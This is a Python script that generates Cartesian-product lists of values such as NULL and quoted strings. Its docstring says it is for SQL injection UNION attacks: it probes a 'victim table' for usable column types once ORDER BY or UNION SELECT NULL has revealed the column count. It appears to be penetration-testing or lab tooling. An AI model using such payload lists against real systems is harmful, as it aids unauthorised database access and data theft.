import sys
from itertools import product

## Used if we are going to redirect output from a print statement to a file
from contextlib import redirect_stdout  

'''
This is a little script to generate the Cartesian Product {Ref 2} of elements for use in
SQL Injection attacks, specifically UNION attacks {Ref 1} to determine columns with useful
data types to route an attack through.

This should be performed after you have determined the number of columns in your victim
table by using a method like ORDER BY N-- (where N is a number of columns) or, alternatively
UNION SELECT NULL,...,NULL-- (where NULL grows to be N), once the DB returns an error, you 
minus 1 and that is N, which is then the <required_input_length> parameter to this script.


References:
1. https://portswigger.net/web-security/sql-injection/union-attacks
2. https://en.wikipedia.org/wiki/Cartesian_product
'''

def cartesian_product_loop(elements, product_size, translation=None):
  for i in product(elements, repeat=product_size):
      # len(i) should be equal to product_size.
      for j in range(0,len(i)):
        if(j == (len(i) - 1)):
          if(translation is None):
            print(i[j])
          else:
            print(i[j].translate(translation))
            ## Could use the next line if you wanted to add a '--' to terminate the SQL statement.
            #print(i[j].translate(translation) + "--")
          
        else:
          if(translation is None):
            print(i[j], end=',')
          else:
            print(i[j].translate(translation), end=',')
  return

def translation_input_parser(translation_input):
  translation_input = translation_input.replace("t=","").strip().split(',')   # Unsanitized Input at this point in time.
  translation = {}
  for t in translation_input:
    try:
      key,value = t.strip().split(":")  # Should be an array of length2
    except Exception as e:
      print(e)
      print("Malformed translation input...\nNow quitting...\n")
      sys.exit(1)
    key = int(key.strip())  # Key should be an int ascii value
    try:
      value = int(value.strip())
    except Exception as e:
      ## If an error occurred its probably because value was supposed to be None to remove the corresponding ascii key.
      value = None
    #else:
    translation.update({key:value})
  return translation

def main(argv):
  '''
    ARGS:
    REQUIRED 1st Arg: elements (the elements that need to be unique in the cartesian product)
    REQUIRED 2nd Arg: input length (aka how big you want your cartesian product to be)
    OPTIONAL (must must be the 3rd arg if present): output filename
    OPTIONAL (can be either 3rd arg if no output filename, otherwise will be 4th arg): translation key-value pairs
    |---> will look like this as a parameter: t=39:None,32:44
    |---> Or this in code: translation = {39:None, 32:44}
        |---> This translation will convert single quotes (') (ascii value 39) to nothing, effectively removing them from output.
        |---> It will also convert whitespace (ascii 32) to commas (ascii 44).
  '''
  if(len(argv) < 2):
    print(
          "USAGE:\tpython3 file.py <elem_1,elem_2,...,elem_N>  <required_input_length> [output_file_name] [t=translation_dict]\n"
          "PRINT TO SCREEN EXAMPLE:\tpython3 file.py \\\"a\\\",NULL  4\n"
          "PRINT TO SCREEN WITH TRANSLATION EXAMPLE:\tpython3 file.py \\\"a\\\",NULL  18 t=39:None,32:44\n"
          "SAVE OUTPUT TO FILE EXAMPLE:\tpython3 file.py \\\"a\\\",NULL  18 output.txt\n"
          "SAVE OUTPUT TO FILE WITH TRANSLATION EXAMPLE:\tpython3 file.py \\\"a\\\",NULL  18 output.txt t=39:None,32:44\n"
          )
    sys.exit(1)
  else:
    print(f"Arguments:\t{argv}")
  unsanitized_elements = argv[0].strip().split(",")
  elements = []
  for val in unsanitized_elements:
    ## Sanitize the input of the first arg, so "elem_1,elem_2,elem_3" , "elem_1, elem_2, elem_3" , and "elem_1,elem_2, elem_3"
    ##   would all be accepted as valid input without fucking up the program.
    #print(val)
    elements.append(val.replace("'","").strip())
    #elements.append(val.strip())
  print(f"\nUsing list of elements:\t{elements}\n")
  product_size = int(argv[1].strip())
  #translation = {}
  translation = None
  try:
    test = argv[2]  # Test to see if it exists, if exception called no filename or translation was passed.
  except Exception as e:
    ## The output file name was not set so set output file name to None.
    output_file_name = None
    ## A translation was not set so set translation variable to None.
    translation = None
  else:
    if("t=" in argv[2].strip()):
      translation = translation_input_parser(argv[2].strip())
      output_file_name = None
    else:
      output_file_name = argv[2].strip()
  try:
    test = argv[3]
  except Exception as e:
    if(translation is not None):
      pass
    else:
      translation = None
  else:
    if("t=" in argv[3].strip()):
      translation = translation_input_parser(argv[3].strip())
    else:
      print("Malformed translation input...\nNow quitting...\n")
      sys.exit(1)

  if output_file_name is None:
    cartesian_product_loop(elements, product_size, translation)
  else:
    with open(output_file_name, 'w') as f:
      with redirect_stdout(f):
        cartesian_product_loop(elements, product_size, translation)
    f.close()



if __name__ == "__main__":
  main(sys.argv[1:])